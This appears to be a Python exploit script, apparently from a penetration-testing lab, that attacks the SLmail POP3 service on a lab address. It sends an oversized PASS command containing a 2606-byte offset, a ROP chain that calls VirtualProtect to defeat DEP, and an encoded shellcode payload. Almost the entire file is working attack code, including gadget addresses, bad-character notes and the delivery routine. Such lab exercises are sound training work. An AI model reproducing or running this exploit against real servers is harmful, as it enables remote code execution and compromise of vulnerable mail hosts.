#!/usr/bin/python
import socket,sys,struct

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


#---------------------------------------------------------[Structure]-#
# LPVOID WINAPI VirtualAlloc(         => PTR to VirtualAlloc          #
#   _In_opt_  LPVOID lpAddress,       => Return Address (Call to ESP) #
#   _In_      SIZE_T dwSize,          => dwSize (0x1)                 #
#   _In_      DWORD flAllocationType, => flAllocationType (0x1000)    #
#   _In_      DWORD flProtect         => flProtect (0x40)             #
# );                                                                  #
#---------------------------------------------------[Register Layout]-#
#
#                                                                     #
# EAX 90909090 => Nop                                                 #
# ECX 00000040 => flProtect                                           #
# EDX 00001000 => flAllocationType                                    #
# EBX 00000001 => dwSize                                              #
# ESP ???????? => Leave as is                                         #
# EBP ???????? => Call to ESP (jmp, call, push,..)                    #
# ESI ???????? => PTR to VirtualAlloc - DWORD PTR of 0x1005d060       #
# EDI 10019C60 => ROP-Nop same as EIP                                 #
#---------------------------------------------------------------------#

rop = struct.pack('<L', 0x76f35785)  # pop edi
rop += struct.pack('<L', 0x5f4011f2) # ret
rop += struct.pack('<L', 0x5f4801bf) # pop esi
rop += struct.pack('<L', 0x75992341) # VirtualProtect()
rop += struct.pack('<L', 0x75a80316) # pop ebp
rop += struct.pack('<L', 0x76f5e871) # JMP ESP
rop += struct.pack('<L', 0x76f47683) # pop ebx
for i in range(1,150):
	rop += struct.pack('<L', 0x76fcc6ea) # inc ebx, ret
rop += struct.pack('<L', 0x76f46b7b) # pop ebx 
rop += struct.pack('<L', 0xffffffff) # 0x-1
for j in range(1,66):
	rop += struct.pack('<L', 0x76f5b27b) # inc edx, ret
rop += struct.pack('<L', 0x76fcd241) # pop ecx
rop += struct.pack('<L', 0x5f4d1010) # writable area start at 0x5f4d0000 to avoid null character use 0x5f4d1010 memory location.
rop += struct.pack('<L',0x75306890) # pop eax
rop += struct.pack('<L',0x90909090) # nop
rop += struct.pack('<L',0x76f01052) # PUSHAD


shellcode =(
"\xba\xae\xa4\xaf\x1f\xd9\xea\xd9\x74\x24\xf4\x58\x33\xc9\xb1"+
"\x52\x83\xc0\x04\x31\x50\x0e\x03\xfe\xaa\x4d\xea\x02\x5a\x13"+
"\x15\xfa\x9b\x74\x9f\x1f\xaa\xb4\xfb\x54\x9d\x04\x8f\x38\x12"+
"\xee\xdd\xa8\xa1\x82\xc9\xdf\x02\x28\x2c\xee\x93\x01\x0c\x71"+
"\x10\x58\x41\x51\x29\x93\x94\x90\x6e\xce\x55\xc0\x27\x84\xc8"+
"\xf4\x4c\xd0\xd0\x7f\x1e\xf4\x50\x9c\xd7\xf7\x71\x33\x63\xae"+
"\x51\xb2\xa0\xda\xdb\xac\xa5\xe7\x92\x47\x1d\x93\x24\x81\x6f"+
"\x5c\x8a\xec\x5f\xaf\xd2\x29\x67\x50\xa1\x43\x9b\xed\xb2\x90"+
"\xe1\x29\x36\x02\x41\xb9\xe0\xee\x73\x6e\x76\x65\x7f\xdb\xfc"+
"\x21\x9c\xda\xd1\x5a\x98\x57\xd4\x8c\x28\x23\xf3\x08\x70\xf7"+
"\x9a\x09\xdc\x56\xa2\x49\xbf\x07\x06\x02\x52\x53\x3b\x49\x3b"+
"\x90\x76\x71\xbb\xbe\x01\x02\x89\x61\xba\x8c\xa1\xea\x64\x4b"+
"\xc5\xc0\xd1\xc3\x38\xeb\x21\xca\xfe\xbf\x71\x64\xd6\xbf\x19"+
"\x74\xd7\x15\x8d\x24\x77\xc6\x6e\x94\x37\xb6\x06\xfe\xb7\xe9"+
"\x37\x01\x12\x82\xd2\xf8\xf5\x6d\x8a\x4a\x8e\x06\xc9\x4a\x8a"+
"\x04\x44\xac\xf8\xb8\x01\x67\x95\x21\x08\xf3\x04\xad\x86\x7e"+
"\x06\x25\x25\x7f\xc9\xce\x40\x93\xbe\x3e\x1f\xc9\x69\x40\xb5"+
"\x65\xf5\xd3\x52\x75\x70\xc8\xcc\x22\xd5\x3e\x05\xa6\xcb\x19"+
"\xbf\xd4\x11\xff\xf8\x5c\xce\x3c\x06\x5d\x83\x79\x2c\x4d\x5d"+
"\x81\x68\x39\x31\xd4\x26\x97\xf7\x8e\x88\x41\xae\x7d\x43\x05"+
"\x37\x4e\x54\x53\x38\x9b\x22\xbb\x89\x72\x73\xc4\x26\x13\x73"+
"\xbd\x5a\x83\x7c\x14\xdf\xb3\x36\x34\x76\x5c\x9f\xad\xca\x01"+
"\x20\x18\x08\x3c\xa3\xa8\xf1\xbb\xbb\xd9\xf4\x80\x7b\x32\x85"+
"\x99\xe9\x34\x3a\x99\x3b")

#---------------------------------------------------------------------#
# Badchars: '\x00\x0d\x0a'                                            #
# kernel32.virtualProtect: 0x5f49a2c0 (SLMFC.dll)                     #
# EIP: 0x5f445804 Random RETN (SLMFC.dll)                      	      #
#---------------------------------------------------------------------#

#add 2606 bytes which is our offset, at 4 B's which should be EIP and pad with 290 C's to crash SLmail
buffer = "A"*2606 + rop + shellcode + "C"*290

try:
	print "\nSending fuzzed buffer..."
	s.connect(('192.168.72.137',110))
	data = s.recv(1024)
	s.send('USER Anowar' + '\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	print "\nDone!,"
except:
	print "Could not connect"
